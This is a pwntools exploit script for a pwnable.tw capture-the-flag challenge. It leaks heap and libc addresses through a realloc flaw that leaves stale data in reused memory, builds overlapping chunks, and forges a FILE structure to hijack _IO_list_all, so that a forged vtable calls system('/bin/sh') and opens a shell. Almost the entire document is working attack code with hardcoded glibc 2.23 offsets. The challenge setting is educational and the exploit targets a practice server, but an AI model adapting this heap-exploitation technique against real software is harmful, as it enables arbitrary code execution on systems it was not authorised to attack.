###realloc not clearing data + IO_list_all hijack

from pwn import *
from IO_FILE import *

###Utils
def List():
    r.sendlineafter('>','list')
    ret = []
    for i in range(10):
        ret.append(r.recvuntil('\n\n'))
    return ret[::-1]

def Note(idx,size,data):
    r.sendlineafter('>','note')
    r.sendlineafter('Cell: ',str(idx))
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Note: ',data)
    return

def punish(idx):
    r.sendlineafter('>','punish')
    r.sendlineafter('Cell: ',str(idx))
    return

def trigger(idx,size):
    r.sendlineafter('>','note')
    r.sendlineafter('Cell: ',str(idx))
    r.sendlineafter('Size: ',str(size))
    return

###Structures
'''
prisoner structure
    |   4   |   4   |   4   |   4   |   
0x00|    risk_ptr   |    name_ptr   |
0x10|    nick_ptr   |  age  |  cell |
0x20|  sentence_ptr |notelen|   ?   |
0x30|    note_ptr   |    next_ptr   |
'''

###Useful Addr
#  libc2.23
main_arena_offset = 0x3c3b20
unsorted_bin_offset = main_arena_offset+0x58
IO_list_all_offset = 0x3c4520
system_offset = 0x45390

###Exploit
r = remote('chall.pwnable.tw',10400)


###Leak heap,libc due to realloc not cleaning blocks
Note(0,0x28,'a')    #B1
Note(1,0x28,'a')    #B1+0x30
Note(0,0x38,'a')    #B1+0x60
Note(1,0x38,'a')    #B1+0xa0
Note(2,0x28,'a')    #B1+0x30
B1_biased_addr = u64(List()[2].strip()[-0x28:-0x20])
Note(1,0x88,'a')    #B1+0xa0
B1_0xd0_top_size = u64(List()[1].strip()[-0x50:-0x48])-1
B1_offset = 0x32000-B1_0xd0_top_size-0xd0
B1_addr = (B1_biased_addr//0x100)*0x100+B1_offset%0x100
Note(2,0x38,'a')    #B1+0x130
Note(1,0x98,'a')    #B1+0x170
Note(0,0x48,'a')    #B1+0x60
unsorted_bin_addr = u64(List()[0].strip()[-8:])
libc_base = unsorted_bin_addr-unsorted_bin_offset

###Resolve addr
system_addr = libc_base+system_offset
vtable_addr = B1_addr+0x260
IO_list_all_addr = libc_base+IO_list_all_offset

###Create overlapping Chunk
punish(0)
Note(2,0x48,p64(0)*5+p32(0x400)+p32(0)+p64(B1_addr)+p64(0))    #Pris1

###free previous pris1 block to unsorted bin
Note(2,0xe8,b'a')   #B1+0x210
Note(1,0xf8,b'a')   #B1+0x300

###Craft fake filestream and hijack IO_list_all
padding = b'\x00'*0x160
IO_FILE = IO_FILE_plus()
stream = IO_FILE.construct(write_base=0,write_ptr=1,vtable=vtable_addr)
stream = b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(IO_list_all_addr-0x10)+stream[0x20:]
stream = stream.ljust(0x100,b'\x00')
IO_jump = IO_jump_t()
vtable = IO_jump.construct(overflow=system_addr)
payload = padding+stream+vtable

Note(0,0x400,payload)
trigger(3,0x100)
r.interactive()

